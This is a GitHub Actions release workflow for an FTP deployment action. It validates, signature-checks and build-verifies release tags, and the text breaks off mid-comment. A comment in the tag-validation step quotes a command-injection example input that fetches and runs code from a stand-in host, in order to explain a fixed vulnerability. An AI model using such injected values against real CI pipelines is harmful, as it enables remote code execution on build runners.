name: Release

# Five-job pipeline: validate-tag-input → (verify-tag-reachability
# ∥ verify-tag-signature) → build → publish. Mirrors
# `airvzxf/moagan`/.github/workflows/release.yml so both repos
# share the same structural guarantees on a release.
#
# Triggers
# --------
# * `push` on tags matching `v[0-9]+.[0-9]+.[0-9]+*` — the `*`
#   suffix allows pre-release tags like `v2.12.0-rc.1` while
#   keeping the strict version-root.
# * `workflow_dispatch` with a strict `pattern:` that fails fast
#   in `validate-tag-input` if the operator mistypes the tag.
#
# Why five jobs (not one)
# -----------------------
# * `validate-tag-input` runs first and exits in <2 s, so a
#   malformed dispatch input is caught before any image is built.
# * `verify-tag-reachability` and `verify-tag-signature` run in
#   parallel and gate `build`. They prove (a) the tag points at a
#   commit reachable from `main` and (b) the tag was signed by a
#   key in the in-repo allow-list. Defence in depth: AGENTS.md
#   spells out the procedural recipe; these jobs are the
#   structural check.
# * `build` checks out the **immutable commit SHA** resolved by
#   `verify-tag-reachability` (not the mutable ref), so a tag
#   force-push mid-run cannot redirect the build. Its first step
#   fails unless that SHA equals the commit of the tag object
#   `verify-tag-signature` verified, so if the two verify jobs'
#   separate fetches disagree, `build` stops before checkout.
# * `publish` only creates the GitHub Release page. The
#   `contents: write` permission is scoped to this job, not the
#   workflow as a whole.
#
# Concurrency
# -----------
# A single release per tag. The group key is the tag name so two
# `release.yml` runs against the same tag cannot race the
# publish step (the second would corrupt the first's release
# page).

on:
  push:
    tags:
      - 'v[0-9]+.[0-9]+.[0-9]+*'
  workflow_dispatch:
    inputs:
      version:
        description: 'Tag to release (e.g. v2.12.0). Must exist on the remote. Format is validated by the validate-tag-input job.'
        required: true
        type: string
        # The GitHub Actions schema for `workflow_dispatch` inputs
        # does not support a `pattern:` field (only `description`,
        # `required`, `type`, `default`), so the regex lives in the
        # `validate-tag-input` job below. The push trigger's tag
        # filter (`v[0-9]+.[0-9]+.[0-9]+*`) is the first line of
        # defence for the push path.

concurrency:
  group: release-${{ github.event.inputs.version || github.ref_name }}
  cancel-in-progress: false

# No top-level `permissions:` — each job declares its own,
# following the principle of least privilege.

jobs:
  # Job 1: tag-input validator. Fails fast on a malformed
  # dispatch input. The `push` tag filter already restricts to
  # `v[0-9]+.[0-9]+.[0-9]+*`, so this job is mostly defensive
  # for the `workflow_dispatch` path where a user could feed
  # arbitrary strings (`main`, `refs/tags/v…`, leading
  # whitespace) into `git rev-parse`. Mirrors moagan's
  # `validate-tag-input` verbatim, with the pre-release suffix
  # added.
  validate-tag-input:
    name: 'Validate · tag input'
    runs-on: ubuntu-latest
    timeout-minutes: 2
    permissions:
      contents: read
    outputs:
      tag: ${{ steps.resolve.outputs.TAG }}
    steps:
      - name: Validate tag shape
        id: resolve
        env:
          RAW: ${{ github.event.inputs.version || github.ref_name }}
        run: |
          set -euo pipefail
          TAG="${RAW}"
          # v2.11.3 (#157): drop the bash-only `[[ =~ ]]` form
          # for a POSIX-portable case pattern. The bash form is
          # currently load-bearing only because GH Actions' default
          # shell for ubuntu-latest is bash, but the project's
          # AGENTS.md convention is `[ ]` over `[[ ]]` and the
          # Makefile `shellcheck` target does not lint .github/
          # workflows/*.yml, so a future maintainer who sets
          # `defaults.run.shell: sh` for hermetic builds would
          # silently break this step. The case form below accepts
          # every shape the bash regex did (single- or multi-digit
          # version components, optional dash-suffix like `-rc.1`),
          # without the bash dependency.
          # v2.11.4 (#211): the prior `case` pattern was a loose
          # shell glob (`v[0-9]*.[0-9]*.[0-9]*`) — it accepted
          # shell metachars after the version root, so a
          # workflow_dispatch caller could feed
          # `version='v1.2.3$(curl evil.com|sh)'` past the
          # validator. The shell sinks downstream (build meta
          # step, publish meta step) interpolated the input
          # directly into `run:` blocks, where GitHub Actions
          # expands the `inputs.version` expression before shell
          # execution. Tighten with an anchored regex via
          # `grep -Eq`: accepts the documented version shape
          # (single- or multi-digit components, optional
          # dash-suffix like `-rc.1`) and rejects everything
          # else, including `$`, `(`, `)`, backtick, `;`, `&`,
          # `|`, and any other shell metacharacter. grep anchors
          # `^`/`$` per line, so the `case` first rejects any
          # non-printable character (newline, CR, tab): the regex
          # then applies to the whole value, not one of its lines.
          case "${TAG}" in
            *[![:print:]]*)
              echo "ERROR: tag input contains a non-printable character (e.g. a line break)"
              exit 1
              ;;
          esac
          if ! printf '%s' "${TAG}" | grep -Eq '^v[0-9]+\.[0-9]+\.[0-9]+(-[0-9A-Za-z.]+)?$'; then
            echo "ERROR: '${TAG}' is not vX.Y.Z (optionally -suffix)"
            exit 1
          fi
          echo "TAG=${TAG}" >> "$GITHUB_OUTPUT"

  # Job 2: tag-reachability guard. Enforces AGENTS.md "tag the
  # trunk merge commit, NOT the branch tip". Runs in parallel
  # with `verify-tag-signature`. Mirrors moagan's
  # `verify-tag-reachability` verbatim, adapted to the
  # `version` input name.
  verify-tag-reachability:
    name: 'Verify · tag is reachable from main'
    runs-on: ubuntu-latest
    timeout-minutes: 5
    permissions:
      contents: read
    needs: validate-tag-input
    outputs:
      tag_commit: ${{ steps.resolve.outputs.TAG_COMMIT }}
    steps:
      - name: Checkout at ref
        # Need a checkout so `git fetch` and `git rev-parse`
        # have a `.git/` to operate on. Pin to the mutable ref
        # here; SHA-pinning is the `build` job's responsibility.
        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          ref: refs/tags/${{ needs.validate-tag-input.outputs.tag }}
          fetch-depth: 0
          persist-credentials: false

      - name: Resolve tag commit + fetch main
        id: resolve
        env:
          TAG: ${{ needs.validate-tag-input.outputs.tag }}
        run: |
          set -euo pipefail
          git fetch --no-tags origin main
          TAG_COMMIT="$(git rev-parse "${TAG}^{commit}")"
          MAIN_COMMIT="$(git rev-parse origin/main)"
          echo "tag=${TAG} tag_commit=${TAG_COMMIT} main_head=${MAIN_COMMIT}"
          {
            echo "TAG=${TAG}"
            echo "TAG_COMMIT=${TAG_COMMIT}"
            echo "MAIN_COMMIT=${MAIN_COMMIT}"
          } >> "$GITHUB_OUTPUT"

      # The image prints /app/VERSION as its banner, but the registry
      # tags and the OCI version label come from the tag name, so a
      # forgotten bump would ship :3.2.0 announcing v3.1.0 (FND-0031).
      # VERSION must equal the tag's core version (`v` and any
      # `-suffix` removed): v3.2.0 and v3.2.0-rc.1 both need 3.2.0.
      # A pre-release is a dry run of the same release, so it carries
      # the same VERSION and the same CHANGELOG [X.Y.Z] section as the
      # final tag; tests/release-smoke.sh Check 2 (vX.Y.Z banner) and
      # tests/contract.sh (CHANGELOG/SECURITY stamps match VERSION)
      # then hold for both unchanged.
      - name: Fail if VERSION at the tag commit differs from the tag
        env:
          TAG: ${{ steps.resolve.outputs.TAG }}
          TAG_COMMIT: ${{ steps.resolve.outputs.TAG_COMMIT }}
        run: |
          set -euo pipefail
          core="${TAG#v}"
          core="${core%%-*}"
          if ! raw="$(git show "${TAG_COMMIT}:VERSION")"; then
            echo "::error::VERSION is missing at ${TAG} (${TAG_COMMIT}); expected ${core}. Bump VERSION in the release PR (AGENTS.md 'Red / failed workflows' step 7) and re-tag."
            exit 1
          fi
          # First line, surrounding whitespace (CR included) trimmed.
          version="$(printf '%s\n' "${raw}" | sed -e '1!d' -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')"
          if [ "${version}" != "${core}" ]; then
            echo "::error::VERSION at ${TAG} (${TAG_COMMIT}) is '${version}', expected '${core}'. Bump VERSION in the release PR (AGENTS.md 'Red / failed workflows' step 7) and re-tag."
            exit 1
          fi
          echo "✓ VERSION ${version} matches ${TAG}"

      - name: Fail if tag^{commit} is not an ancestor of main
        env:
          TAG: ${{ steps.resolve.outputs.TAG }}
          TAG_COMMIT: ${{ steps.resolve.outputs.TAG_COMMIT }}
          MAIN_COMMIT: ${{ steps.resolve.outputs.MAIN_COMMIT }}
        run: |
          set -euo pipefail
          if git merge-base --is-ancestor "${TAG_COMMIT}" origin/main; then
            echo "✓ ${TAG} (${TAG_COMMIT}) is reachable from origin/main (${MAIN_COMMIT})"
            exit 0
          fi
          {
            echo "ERROR: tag ${TAG} points at ${TAG_COMMIT}, which is NOT an"
            echo "ancestor of origin/main (${MAIN_COMMIT})."
            echo ""
            echo "This means the tag was created on a branch tip or a local"
            echo "commit that was later squashed away when the release PR"
            echo "was merged into main. The release would publish an image"
            echo "whose SHA does not correspond to any commit reachable from"
            echo "main, breaking the audit log."
            echo ""
            echo "Fix (delete the orphan tag, re-tag the merge commit on main):"
            echo "  git tag -d ${TAG}"
            echo "  git push origin :refs/tags/${TAG}"
            echo "  git checkout main && git reset --hard origin/main"
            echo "  git tag -s ${TAG} \$(git rev-parse origin/main)"
            echo "  git push origin ${TAG}"
            echo ""
            echo "See AGENTS.md 'tag the trunk merge commit, NOT the branch tip'."
          } >&2
          exit 1

  # Job 3: tag-signature guard. Verifies that the tag was
  # signed by a key in `.github/trusted-signers` (SSH) or
  # `.github/trusted-signers.asc` (PGP) before any image is
  # built or published. The allow-list is fetched from
  # `origin/main` (NOT the tagged tree) so revoking a key on
  # main takes effect on the next release — otherwise the
  # trust anchor is the same object being verified and
  # revocation is structurally impossible. The PGP `.asc`
  # allow-list is consulted only when the tag being verified
  # is PGP-signed (v2.10.0 and earlier); v2.11.0+ SSH tags
  # never import the GPG key. Mirrors moagan's
  # `verify-tag-signature` job, with the dual-backend
  # detection added.
  verify-tag-signature:
    name: 'Verify · tag is signed by a trusted signer'
    runs-on: ubuntu-latest
    timeout-minutes: 5
    permissions:
      contents: read
    needs: validate-tag-input
    outputs:
      verified_commit: ${{ steps.verify.outputs.VERIFIED_COMMIT }}
    steps:
      - name: Checkout at ref
        # Need a checkout so `git show` and `git fetch` have a
        # `.git/` to operate on. Pin to the mutable ref (the
        # SHA pinning is `build`'s job).
        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          ref: refs/tags/${{ needs.validate-tag-input.outputs.tag }}
          fetch-depth: 1
          persist-credentials: false

      - name: Fetch allow-list from origin/main
        # The trust anchor lives on `main`, not on the tagged
        # tree. Reading it from the tagged tree makes key
        # revocation ineffective: a compromised key could
        # re-cut a tag pointing at an old commit whose tree
        # still lists that key, and verification would pass.
        # Pinning to a fixed ref (origin/main) closes that
        # gap.
        run: |
          set -euo pipefail
          git fetch --no-tags --depth=1 origin main
          mkdir -p "$RUNNER_TEMP/trusted"
          git show "origin/main:.github/trusted-signers" \
            > "$RUNNER_TEMP/trusted/allowed_signers"
          # `.asc` is optional: only imported when the tag is
          # actually PGP-signed (v2.10.0 and earlier). v2.11.0+
          # tags are SSH-signed and never consult this file.
          if git show "origin/main:.github/trusted-signers.asc" \
              > "$RUNNER_TEMP/trusted/allowed_signers.asc" 2>/dev/null; then
            echo "PGP allow-list fetched"
          else
            echo "PGP allow-list absent on origin/main (acceptable; SSH-only signers)"
            rm -f "$RUNNER_TEMP/trusted/allowed_signers.asc"
          fi
          test -s "$RUNNER_TEMP/trusted/allowed_signers" \
            || { echo "ERROR: empty .github/trusted-signers on origin/main"; exit 1; }

      - name: Configure git to use the trusted signers file
        # `git verify-tag` consults `gpg.ssh.allowedsignersfile`
        # for SSH-signed tags and the GPG keyring for PGP-signed
        # tags. Both paths auto-detect from the tag's signature
        # format, so the same verification works for v2.10.0
        # (PGP) and v2.11.0+ (SSH) without conditional logic.
        run: |
          set -euo pipefail
          git config gpg.format ssh
          git config gpg.ssh.allowedsignersfile "$RUNNER_TEMP/trusted/allowed_signers"

      - name: Import GPG allow-list if the tag is PGP-signed
        # v2.10.0 and earlier were PGP-signed with the
        # maintainer's RSA key. Importing into the runner's
        # keyring only when needed avoids the `.asc` becoming
        # a hard dependency for SSH-only releases (which would
        # otherwise block the documented key-removal path in
        # AGENTS.md).
        env:
          TAG: ${{ needs.validate-tag-input.outputs.tag }}
        run: |
          set -euo pipefail
          if git cat-file tag "$TAG" | grep -q 'BEGIN PGP SIGNATURE'; then
            test -f "$RUNNER_TEMP/trusted/allowed_signers.asc" \
              || { echo "ERROR: tag is PGP-signed but .github/trusted-signers.asc is missing on origin/main"; exit 1; }
            gpg --batch --import "$RUNNER_TEMP/trusted/allowed_signers.asc"
          else
            echo "Tag uses SSH signature — GPG keyring not required"
          fi

      - name: Verify tag signature
        id: verify
        env:
          TAG: ${{ needs.validate-tag-input.outputs.tag }}
        run: |
          set -euo pipefail
          if git verify-tag "refs/tags/${TAG}"; then
            echo "✓ ${TAG} is signed by a key in .github/trusted-signers"
            # git verify-tag does not check that the signed object's
            # own `tag` header names this ref; without this, an old
            # signed tag object re-pushed as refs/tags/${TAG} passes.
            TAG_NAME="$(git cat-file tag "refs/tags/${TAG}" | sed -n '1,/^$/s/^tag //p')"
            if [ -z "${TAG_NAME}" ]; then
              echo "::error::refs/tags/${TAG} has no tag header (not a tag object)"
              exit 1
            fi
            if [ "${TAG_NAME}" != "${TAG}" ]; then
              echo "::error::tag object is named '${TAG_NAME}' but was pushed as refs/tags/${TAG}"
              exit 1
            fi
            VERIFIED_COMMIT="$(git rev-parse "refs/tags/${TAG}^{commit}")"
            echo "VERIFIED_COMMIT=${VERIFIED_COMMIT}" >> "$GITHUB_OUTPUT"
            exit 0
          fi
          {
            echo "ERROR: tag ${TAG} is NOT signed by a key in"
            echo ".github/trusted-signers (fetched from origin/main)."
            echo ""
            echo "Signer info for diagnosis:"
            git cat-file tag "${TAG}" \
              | grep -E '^(tagger|-----BEGIN|-----END)' \
              | head -10 >&2 || true
            echo ""
            echo "Allow-list (SSH): $(wc -l < "$RUNNER_TEMP/trusted/allowed_signers") lines"
            echo ""
            echo "Either the tag is unsigned, or it was signed by a key"
            echo "not on the allow-list."
            echo ""
            echo "Fix (re-tag with the maintainer's signing key):"
            echo "  git tag -d ${TAG}"
            echo "  git push origin :refs/tags/${TAG}"
            msg="release: ${TAG#v}"
            echo "  git tag -s ${TAG} -m '${msg}'"
            echo "  git push origin ${TAG}"
            echo ""
            echo "See .github/trusted-signers and AGENTS.md 'Tag signature guard'."
          } >&2
          exit 1

  # Job 4: build. Gated on jobs 2 + 3. SHA-pinned checkout.
  # Pushes the image by digest, untagged, to ghcr.io (always)
  # plus Docker Hub and ECR Public (when the right secrets are
  # set). Smoke-tests that digest, generates a CycloneDX SBOM
  # from it, signs it with cosign keyless and attaches the SBOM
  # attestation, extracts the CHANGELOG section for this
  # version, and bundles the SBOM + body file for the publish
  # job. Only then does its last step point the public tags at
  # the digest: :X.Y.Z and :vX.Y.Z first, :latest last (never
  # for a pre-release). A failure anywhere before that leaves
  # every public tag where it was.
  build:
    name: 'Build · release image'
    runs-on: ubuntu-latest
    timeout-minutes: 30
    permissions:
      contents: read
      packages: write
      id-token: write
      attestations: write
    needs: [validate-tag-input, verify-tag-reachability, verify-tag-signature]
    steps:
      # The verify jobs fetch the mutable tag separately. Refuse to
      # build unless the commit of the tag object whose signature was
      # verified is the commit reachability approved (FND-0027).
      - name: Fail if the verified tag commit differs from tag_commit
        id: bind-commit
        env:
          VERIFIED_COMMIT: ${{ needs.verify-tag-signature.outputs.verified_commit }}
          TAG_COMMIT: ${{ needs.verify-tag-reachability.outputs.tag_commit }}
        run: |
          set -euo pipefail
          for pair in "verified_commit=${VERIFIED_COMMIT}" "tag_commit=${TAG_COMMIT}"; do
            if ! [[ "${pair#*=}" =~ ^[0-9a-f]{40}$ ]]; then
              echo "::error::${pair%%=*} '${pair#*=}' is not a 40-char lowercase hex SHA"
              exit 1
            fi
          done
          if [ "${VERIFIED_COMMIT}" != "${TAG_COMMIT}" ]; then
            echo "::error::Signed tag points at ${VERIFIED_COMMIT}, but reachability approved ${TAG_COMMIT}; the tag moved between the verify jobs"
            exit 1
          fi
          echo "✓ verified tag commit equals tag_commit (${TAG_COMMIT})"

      # v2.10.0+: this step resolves the tag/version AND
      # decides which secondary registries are enabled, based
      # on the presence of DOCKERHUB_USERNAME+DOCKERHUB_TOKEN
      # and AWS_ROLE_TO_ASSUME secrets. Kept verbatim from the
      # v2.10.0 single-job pipeline.
      - name: Resolve tag, version and enabled registries
        id: meta
        env:
          INPUT_VERSION: ${{ needs.validate-tag-input.outputs.tag }}
          DOCKERHUB_USERNAME: ${{ secrets.DOCKERHUB_USERNAME }}
          DOCKERHUB_TOKEN: ${{ secrets.DOCKERHUB_TOKEN }}
          AWS_ROLE_TO_ASSUME: ${{ secrets.AWS_ROLE_TO_ASSUME }}
        run: |
          set -euo pipefail
          if [ "${GITHUB_EVENT_NAME}" = "workflow_dispatch" ]; then
            tag="${INPUT_VERSION}"
          else
            tag="${GITHUB_REF_NAME}"
          fi
          version="${tag#v}"
          owner="${{ github.repository_owner }}"
          image="ghcr.io/${owner}/ftp-deployment-action"

          {
            echo "tag=${tag}"
            echo "version=${version}"
            echo "image=${image}"
          } >> "$GITHUB_OUTPUT"

          # F2 audit (#275): detect pre-release tags (anything with
          # a `-suffix` after the X.Y.Z root) and SKIP the `:latest`
          # Docker alias for them. The validator accepts tags like
          # v2.12.0-rc.1, v2.12.0-alpha.1, v2.12.0-beta.1, and
          # without this guard those tags would silently overwrite
          # the stable `:latest` image. PR #276 (commit d1888e4)
          # already fixed the GitHub Release page side; this is the
          # Docker-push counterpart. Stable tags (no `-suffix`)
          # still get `:latest` as before.
          pre_release=false
          case "${version}" in
            *-*) pre_release=true ;;
          esac
          echo "pre_release=${pre_release}" >> "$GITHUB_OUTPUT"

          # ghcr.io is always published (GITHUB_TOKEN is automatic).
          tags="${image}:${version}"$'\n'"${image}:${tag}"
          if [ "${pre_release}" = false ]; then
            tags="${tags}"$'\n'"${image}:latest"
          fi

          dockerhub_image=""
          ecr_image=""

          if [ -n "${DOCKERHUB_USERNAME}" ] && [ -n "${DOCKERHUB_TOKEN}" ]; then
            dockerhub_image="docker.io/${owner}/ftp-deployment-action"
            tags="${tags}"$'\n'"${dockerhub_image}:${version}"$'\n'"${dockerhub_image}:${tag}"
            if [ "${pre_release}" = false ]; then
              tags="${tags}"$'\n'"${dockerhub_image}:latest"
            fi
            {
              echo "dockerhub_image=${dockerhub_image}"
              echo "dockerhub_enabled=true"
            } >> "$GITHUB_OUTPUT"
            echo "Docker Hub publishing ENABLED (${dockerhub_image})"
          else
            # v2.11.4 (#217): always emit the `dockerhub_*` outputs
            # (even on the disabled branch) so downstream cosign /
            # SBOM guards can rely on the invariant
            # "enabled=true ⇒ image is set; otherwise both are empty".
            # Pre-fix, a downstream step reading an unset
            # `steps.meta.outputs.dockerhub_image` on the disabled
            # branch could silently produce an empty string and a
            # confusing cosign error.
            {
              echo "dockerhub_image="
              echo "dockerhub_enabled=false"
            } >> "$GITHUB_OUTPUT"
            echo "::notice::Docker Hub secrets (DOCKERHUB_USERNAME, DOCKERHUB_TOKEN) not set; skipping docker.io publish"
          fi

          # ECR Public publishing is intentionally disabled. The
          # AWS_ROLE_TO_ASSUME secret exists in the repo but the
          # IAM role's OIDC trust policy is not configured to
          # allow this repo, which makes `Configure AWS
          # credentials (OIDC) for ECR Public` fail with
          # `Not authorized to perform sts:AssumeRoleWithWebIdentity`.
          # The maintainer does not currently have access to the
          # AWS account, so we cannot fix the trust policy from
          # the repo side. We keep the conditional block (instead
          # of deleting it) so the re-enable diff is trivial, but
          # emit empty `ecr_*` outputs so downstream guards
          # always see a defined value (v2.11.4, #217). The
          # `ECR_DISABLED_FORCE` opt-in switch is intentionally
          # unset in CI today; setting it (e.g. for a one-off
          # test run) combined with `AWS_ROLE_TO_ASSUME` is
          # enough to enable the publish path without rewriting
          # this step.
          # ECR Public namespace `m2z1h0m9` is a per-account AWS ID,
          # not a GitHub owner; derive from `owner` only after the IAM
          # trust policy is rewritten to authorize per-fork OIDC subjects.
          if [ -n "${ECR_DISABLED_FORCE:-}" ] && [ -n "${AWS_ROLE_TO_ASSUME}" ]; then
            ecr_image="public.ecr.aws/m2z1h0m9/ftp-deployment-action"
            tags="${tags}"$'\n'"${ecr_image}:${version}"$'\n'"${ecr_image}:${tag}"
            if [ "${pre_release}" = false ]; then
              tags="${tags}"$'\n'"${ecr_image}:latest"
            fi
            {
              echo "ecr_image=${ecr_image}"
              echo "ecr_enabled=true"
            } >> "$GITHUB_OUTPUT"
            echo "ECR Public publishing ENABLED (${ecr_image})"
          else
            {
              echo "ecr_image="
              echo "ecr_enabled=false"
            } >> "$GITHUB_OUTPUT"
            echo "::notice::ECR Public publishing disabled in release.yml (AWS IAM trust policy needs update); skipping public.ecr.aws publish"
          fi

          # Comma-separated names the build pushes by digest to: the
          # same registries, decided above, that `all_tags` covers.
          image_names="${image}"
          if [ -n "${dockerhub_image}" ]; then
            image_names="${image_names},${dockerhub_image}"
          fi
          if [ -n "${ecr_image}" ]; then
            image_names="${image_names},${ecr_image}"
          fi
          echo "image_names=${image_names}" >> "$GITHUB_OUTPUT"

          # Heredoc-style multi-line output for `all_tags`.
          # Each tag on its own line so the delimiter lands
          # on its own line — `printf '%s'` would glue the last
          # tag to the delimiter and trip GitHub's output
          # parser with "Matching delimiter not found".
          # The delimiter is random, per GitHub's documented
          # guidance for multi-line values: a fixed `EOF` ends the
          # value early at any value line that is exactly `EOF`.
          delim="EOF_$(openssl rand -hex 16)"
          {
            echo "all_tags<<${delim}"
            echo "${image}:${version}"
            echo "${image}:${tag}"
            if [ "${pre_release}" = false ]; then
              echo "${image}:latest"
            fi
            if [ -n "${dockerhub_image}" ]; then
              echo "${dockerhub_image}:${version}"
              echo "${dockerhub_image}:${tag}"
              if [ "${pre_release}" = false ]; then
                echo "${dockerhub_image}:latest"
              fi
            fi
            if [ -n "${ecr_image}" ]; then
              echo "${ecr_image}:${version}"
              echo "${ecr_image}:${tag}"
              if [ "${pre_release}" = false ]; then
                echo "${ecr_image}:latest"
              fi
            fi
            echo "${delim}"
          } >> "$GITHUB_OUTPUT"

          # F2 audit (#275) hardened in v2.11.10 (#288): refuse to publish
          # a pre-release tag with a :latest alias. Grep the parsed
          # `tags` list (not the raw $GITHUB_OUTPUT file, which also
          # contains `tag=`, `image=`, the all_tags heredoc, and the
          # `dockerhub_*` / `ecr_*` metadata lines); a future maintainer
          # adding any output value containing the substring `:latest`
          # would otherwise false-positive here. `-Fxq`: full-line,
          # fixed-string, quiet — matches only if some line in `tags`
          # is exactly `${image}:latest`.
          if [ "${pre_release}" = true ] && printf '%s\n' "${tags}" | grep -Fxq -e "${image}:latest"; then
            echo "::error::Pre-release tag ${tag} must not publish a :latest alias"
            exit 1
          fi

          echo "Resolved tag=${tag}, version=${version}"
          echo "Push by digest to: ${image_names}"
          echo "Tags to publish after smoke, SBOM, sign and attest:"
          printf '%s\n' "${tags}"

      # SHA-pinned checkout: closes the TOCTOU gap. A tag
      # force-push that arrives mid-run cannot redirect
      # checkout away from the commit the two verify jobs just
      # approved (the first step of this job checks that both
      # jobs saw the same commit).
      - name: Checkout source at the pinned tag SHA
        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          fetch-depth: 0
          ref: ${{ needs.verify-tag-reachability.outputs.tag_commit }}
          persist-credentials: false

      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@f87e5991a6d7451dcb8d9637bfbc97413f497069 # v4.4.1

      - name: Log in to ghcr.io
        uses: docker/login-action@dbcb813823bdd20940b903addbd779551569679f # v4.6.0
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Log in to Docker Hub
        if: ${{ steps.meta.outputs.dockerhub_enabled == 'true' }}
        uses: docker/login-action@dbcb813823bdd20940b903addbd779551569679f # v4.6.0
        with:
          registry: docker.io
          username: ${{ secrets.DOCKERHUB_USERNAME }}
          password: ${{ secrets.DOCKERHUB_TOKEN }}

      - name: Build and push image
        id: build
        uses: docker/build-push-action@c3c9e263c25d99ce0380d002d59b67737d91b0dc # v7.4.0
        with:
          context: .
          file: ./Dockerfile
          # Push by digest only, with no tag, to every enabled
          # registry (`image_names` from the meta step). The public
          # tags in `all_tags` are added by the last step of this
          # job, after the smoke test, SBOM, cosign and attestation
          # have all passed on this digest.
          outputs: type=image,"name=${{ steps.meta.outputs.image_names }}",push-by-digest=true,name-canonical=true,push=true
          labels: |
            org.opencontainers.image.title=ftp-deployment-action
            org.opencontainers.image.description=GitHub Action that copies files via FTP/FTPS using lftp
            org.opencontainers.image.source=${{ github.server_url }}/${{ github.repository }}
            org.opencontainers.image.licenses=AGPL-3.0
            org.opencontainers.image.version=${{ steps.meta.outputs.version }}
          # No build cache. A GitHub Actions cache entry is scoped
          # to the ref that wrote it, and a tag run reads only its
          # own ref and the default branch, so no release could
          # reuse an earlier release's layers. The build installs
          # two apk packages in about a second. See AGENTS.md
          # design decision 6; acceptance check S14 enforces it.

      # Every later step addresses the image as <image>@<digest>,
      # so refuse anything but one sha256 digest before first use.
      - name: Validate the pushed image digest
        id: digest
        env:
          DIGEST: ${{ steps.build.outputs.digest }}
        run: |
          set -euo pipefail
          if ! [[ "${DIGEST}" =~ ^sha256:[0-9a-f]{64}$ ]]; then
            echo "::error::build digest '${DIGEST}' is not sha256: followed by 64 lowercase hex characters"
            exit 1
          fi
          echo "digest=${DIGEST}" >> "$GITHUB_OUTPUT"
          echo "✓ pushed digest ${DIGEST}"

      # v2.10.0+: ECR Public is a SECONDARY publish target. OIDC
      # role assumption (no static AWS secrets) is configured in
      # two steps: configure-aws-credentials assumes the role and
      # exports AWS_ACCESS_KEY_ID/secret/session to subsequent
      # steps; amazon-ecr-login then uses those credentials to
      # call ecr-public:GetAuthorizationToken and to docker login
      # to public.ecr.aws. The IAM role trust policy must list
      # `token.actions.githubusercontent.com` as a federated
      # principal with a `sub` condition matching this repo (see
      # README section "Publishing targets" for the JSON).
      #
      # DISABLED: see the comment on the ECR Public block in
      # the `Resolve tag, version and enabled registries` step
      # above for why these steps are commented out. All ECR
      # sites in this job (login ×2 here, cosign-sign ECR branch
      # in the `Sign image with cosign` step, and the SBOM
      # attestation step further down) follow the same DISABLED
      # pattern: commented out, kept in-tree as documentation,
      # re-enabled via uncomment when the IAM trust policy is
      # rewritten (tracked in #212). The re-enable diff stays a
      # one-operator mechanical change.
      #
      # - name: Configure AWS credentials (OIDC) for ECR Public
      #   if: ${{ steps.meta.outputs.ecr_enabled == 'true' }}
      #   uses: aws-actions/configure-aws-credentials@e6de054238d6b7531b4efff3b6587d9aade6a06c # v6.2.3
      #   with:
      #     role-to-assume: ${{ secrets.AWS_ROLE_TO_ASSUME }}
      #     # ECR Public control plane lives in us-east-1 regardless
      #     # of where the ECR Public registry "lives" (ECR Public
      #     # has no region concept; the public.ecr.aws endpoint is
      #     # global).
      #     aws-region: us-east-1
      #
      # - name: Log in to ECR Public
      #   if: ${{ steps.meta.outputs.ecr_enabled == 'true' }}
      #   uses: aws-actions/amazon-ecr-login@03f1aad4c6c7ffd436567f42f9384779290529bd # v2.1.7
      #   with:
      #     registry-type: public

      # v2.4.0+: smoke-test the just-pushed image before
      # signing and attaching the SBOM. The image is pushed by
      # digest only, so a Dockerfile / lftp pin / runtime
      # regression fails here before any public tag (:latest
      # included) points at it; the tags are added by the last
      # step of this job. Smoke, SBOM, cosign and attest all use
      # <image>@<digest>, never a mutable tag.
      # v2.10.0+: smoke-test only the ghcr.io image. The
      # three registries receive the exact same image bytes
      # from a single `docker buildx build`, so a ghcr.io
      # failure implies the same failure on docker.io and
      # public.ecr.aws.
      - name: Smoke test the just-pushed image
        env:
          IMAGE: ${{ steps.meta.outputs.image }}@${{ steps.digest.outputs.digest }}
        run: |
          set -euo pipefail
          tests/release-smoke.sh "${IMAGE}"

      - name: Generate SBOM (CycloneDX)
        uses: anchore/sbom-action@66cbf4bc1f1c0d2edc94016e65bc221b6bb0ad6c # v0.24.3
        with:
          image: ${{ steps.meta.outputs.image }}@${{ steps.digest.outputs.digest }}
          format: cyclonedx-json
          artifact-name: sbom.cyclonedx.json

      - name: Download SBOM artifact for attestation + bundle
        uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8.0.2
        with:
          name: sbom.cyclonedx.json
          path: .

      - name: Install cosign
        uses: sigstore/cosign-installer@6f9f17788090df1f26f669e9d70d6ae9567deba6 # v4.1.2

      - name: Sign image with cosign (keyless, OIDC)
        env:
          COSIGN_EXPERIMENTAL: '1'
          DIGEST: ${{ steps.digest.outputs.digest }}
        run: |
          set -euo pipefail
          cosign sign --yes "${{ steps.meta.outputs.image }}@${DIGEST}"
          if [ "${{ steps.meta.outputs.dockerhub_enabled }}" = "true" ]; then
            cosign sign --yes "${{ steps.meta.outputs.dockerhub_image }}@${DIGEST}"
          fi
          if [ "${{ steps.meta.outputs.ecr_enabled }}" = "true" ]; then
            cosign sign --yes "${{ steps.meta.outputs.ecr_image }}@${DIGEST}"
          fi

      - name: Attach SBOM attestation to ghcr.io image
        uses: actions/attest@1e69f48acb82d1966a394da916b4c1698aa569d6 # v4.2.2
        with:
          subject-name: ${{ steps.meta.outputs.image }}
          subject-digest: ${{ steps.digest.outputs.digest }}
          sbom-path: sbom.cyclonedx.json
          push-to-registry: true

      - name: Attach SBOM attestation to Docker Hub image
        if: ${{ steps.meta.outputs.dockerhub_enabled == 'true' }}
        uses: actions/attest@1e69f48acb82d1966a394da916b4c1698aa569d6 # v4.2.2
        with:
          subject-name: ${{ steps.meta.outputs.dockerhub_image }}
          subject-digest: ${{ steps.digest.outputs.digest }}
          sbom-path: sbom.cyclonedx.json
          push-to-registry: true

      # v2.11.11 (#216): DISABLED. ECR Public publishing is
      # intentionally off (see the `Resolve tag, version and enabled
      # registries` step's ECR block above). The conditional
      # `if: ecr_enabled == 'true'` is dead until ECR is re-enabled,
      # but we keep this step commented out (matching the two ECR
      # login steps earlier in this job, also commented out) so the
      # re-enable diff is a one-step uncomment and the
